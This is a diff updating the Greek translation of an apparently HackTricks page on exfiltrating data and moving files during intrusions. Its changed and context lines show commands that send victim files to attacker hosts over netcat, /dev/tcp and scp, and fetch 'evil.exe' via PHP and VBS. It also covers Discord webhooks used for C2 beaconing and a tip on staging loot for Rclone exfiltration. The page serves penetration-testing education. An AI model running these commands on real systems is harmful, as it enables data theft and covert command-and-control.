@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> Για ένα end-to-end παράδειγμα του staging loot στο `C:\Users\Public` και exfiltrating με Rclone για να μιμηθεί νόμιμα backups, δείτε τη ροή εργασίας παρακάτω.
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Commonly whitelisted domains to exfiltrate information
 
-Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνηθισμένους whitelisted domains που μπορούν να χρησιμοποιηθούν κακόβουλα
+Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε κοινά whitelisted domains που μπορούν να καταχραστούν
 
 ## Copy\&Paste Base64
 
@@ -45,7 +52,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Μεταφόρτωση αρχείων
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer που εμφανίζει GET and POSTs (και headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Μονάδα Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Server**
+### **HTTPS Διακομιστής**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) για C2 & Data Exfiltration
 
-Τα Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά file parts. Συχνά επιτρέπονται προς αξιόπιστα SaaS domains και δεν απαιτούν OAuth/API keys, καθιστώντας τα χρήσιμα για low-friction beaconing και exfiltration.
+Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά μέρη αρχείων. Συνήθως επιτρέπονται σε αξιόπιστα SaaS domains και δεν απαιτούν OAuth/API keys, καθιστώντας τα χρήσιμα για low-friction beaconing και exfiltration.
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK επιβεβαιώνουν την παράδοση.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Σημειώσεις:
-- Παρόμοια μοτίβα ισχύουν για άλλες πλατφόρμες συνεργασίας (Slack/Teams) που χρησιμοποιούν incoming webhooks· προσαρμόστε το URL και το JSON schema ανάλογα.
-- Για DFIR των artifacts της cache του Discord Desktop και ανάκτηση webhook/API, δείτε:
+- Παρόμοια μοτίβα εφαρμόζονται σε άλλες πλατφόρμες συνεργασίας (Slack/Teams) που χρησιμοποιούν τα incoming webhooks; προσαρμόστε το URL και το JSON schema ανάλογα.
+- Για DFIR των Discord Desktop cache artifacts και webhook/API recovery, δείτε:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -187,12 +194,12 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP διακομιστής (python)
+### Διακομιστής FTP (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### Διακομιστής FTP (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -228,14 +235,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali ως server
+Kali ως διακομιστής
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ή δημιούργησε ένα smb share **χρησιμοποιώντας samba**:
+Ή δημιουργήστε ένα smb share **χρησιμοποιώντας samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Ο επιτιθέμενος πρέπει να έχει SSHd ενεργό.
+Ο επιτιθέμενος πρέπει να έχει SSHd σε λειτουργία.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Εάν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να mount έναν κατάλογο από το θύμα στον επιτιθέμενο.
+Αν το victim έχει SSH, ο attacker μπορεί να mount ένα directory από το victim στον attacker.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,7 +286,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Κατέβασμα αρχείου από victim
+### Λήψη αρχείου από victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -313,15 +320,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Εάν μπορείτε να στείλετε δεδομένα σε έναν SMTP server, μπορείτε να δημιουργήσετε έναν SMTP για να λαμβάνετε τα δεδομένα με python:
+Εάν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν διακομιστή SMTP για να λάβετε τα δεδομένα με python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Ενεργό από προεπιλογή στα XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)
+Από προεπιλογή στα XP και 2003 (σε άλλα χρειάζεται να προστεθεί ρητά κατά την εγκατάσταση)
 
-Στο Kali, **start TFTP server**:
+Στο Kali, **ξεκινήστε TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -339,7 +346,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατέβασε ένα αρχείο με PHP oneliner:
+Κατεβάστε ένα αρχείο με ένα PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των binaries αλλά έχει επίσης την **ικανότητα να τα ανακατασκευάζει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός binary, `debug.exe` μπορεί να δημιουργήσει το binary file. Ωστόσο, είναι σημαντικό να σημειωθεί ότι debug.exe έχει **περιορισμό στο να συναρμολογεί αρχεία μέχρι 64 kb σε μέγεθος**.
+Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των binaries αλλά έχει επίσης την **ικανότητα να τα ανακατασκευάσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το αρχείο binary. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει έναν **περιορισμό στο να συναρμολογεί αρχεία έως και 64 kb σε μέγεθος**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Στη συνέχεια κάντε αντιγραφή-επικόλληση του κειμένου στο windows-shell και θα δημιουργηθεί ένα αρχείο με το όνομα nc.exe.
+Στη συνέχεια, κάντε αντιγραφή και επικόλληση του κειμένου στο windows-shell και θα δημιουργηθεί ένα αρχείο με όνομα nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
